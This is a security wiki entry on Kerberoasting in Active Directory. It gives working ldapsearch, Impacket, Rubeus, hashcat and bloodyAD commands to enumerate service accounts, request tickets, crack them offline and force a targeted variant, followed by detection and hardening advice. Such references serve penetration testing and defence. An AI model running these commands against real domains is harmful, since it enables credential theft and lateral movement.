---
title: Kerberoasting
slug: kerberoasting
---

> **TL;DR:** Any authenticated user can request a TGS for any SPN-bound account; the ticket's service-key-encrypted portion is offline-crackable, exposing weak service-account passwords.

## What it is
Kerberos service tickets (TGS) are encrypted with the service account's long-term key. Active Directory permits any authenticated principal to ask for a TGS for any registered SPN — that's how Kerberos works. If the SPN belongs to a **user account** (not a computer / gMSA), and the password is weak, the attacker captures the TGS and brute-forces it offline. Computer accounts have 120-character random passwords and are not crackable; user-bound SPNs are.

## Preconditions / where it applies
- Any valid domain credential (low-priv user is fine).
- LDAP + Kerberos reachability to a DC.
- Target user accounts with `servicePrincipalName` populated. Service accounts running SQL, IIS app pools, web apps, scheduled tasks.
- AS-REP roasting ([[asreproast]]) is the sibling primitive that doesn't even need creds — covered separately.

## Technique
Enumerate, request, crack.

```bash
# Enumerate SPN-bearing users
ldapsearch -h dc -D 'me@corp.lab' -w 'pw' -b 'DC=corp,DC=lab' \
  '(&(samAccountType=805306368)(servicePrincipalName=*))' samaccountname servicePrincipalName

# Impacket — request TGS for every SPN-user
GetUserSPNs.py -request -dc-ip 10.0.0.1 corp.lab/me:'pw' -outputfile hashes.kerb

# Rubeus (Windows, in-domain)
Rubeus.exe kerberoast /outfile:hashes.kerb /nowrap
```

Force RC4 if AES is configured (RC4 cracks ~100x faster on the same hardware): some tools accept `/tgtdeleg` or use `-supported-encryption-types 23` to negotiate down. Modern DCs with AES-only flags refuse RC4 — you'll get etype 18 (AES256) and crack accordingly.

```bash
# Hashcat — mode 13100 for TGS-REP RC4, 19700 for AES256
hashcat -m 13100 hashes.kerb wordlist.txt -r rules/best64.rule
hashcat -m 19700 hashes.kerb wordlist.txt
```

Targeted variant — if you have GenericWrite on a user (see [[acl-abuse]]), set an SPN on them, kerberoast, remove SPN:

```bash
bloodyAD -d corp -u me -p 'pw' --host dc set object victim servicePrincipalName 'fake/svc'
GetUserSPNs.py -request -dc-ip 10.0.0.1 -no-preauth victim corp.lab/
```

Once cracked, the cleartext often unlocks lateral movement: same password is reused for the service's local admin elsewhere, or the account is itself a Domain Admin (a common misconfiguration).

## Detection and defence
- 4769 events with `TicketEncryptionType=0x17` (RC4) for a user account SPN are the canonical signal. Volume + non-business-hours + many distinct SPNs = roasting.
- Defender for Identity has a "Suspected Kerberoasting" detector keyed on enumeration patterns.
- Hard mitigations: use Group Managed Service Accounts (gMSA) or computer-account SPNs — random 120-char passwords. Disable RC4 for service accounts and set the `msDS-SupportedEncryptionTypes` AES-only flag.
- Add high-value service accounts to Protected Users (forces AES, no RC4 fallback).
- Enforce ≥25 character passwords on any account holding an SPN.
- Kill stale SPNs that point at unused services.

## References
- [the.hacker.recipes — Kerberoasting](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast) — full walkthrough
- [HackTricks — Kerberoast](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/kerberoast.html) — tool reference
- [SpecterOps — Cracking Kerberos](https://posts.specterops.io/) — modern AES considerations
- [Microsoft — Decrypting the selection of supported Kerberos encryption types](https://techcommunity.microsoft.com/blog/coreinfrastructureandsecurityblog/decrypting-the-selection-of-supported-kerberos-encryption-types/1628797) — enctype matrix
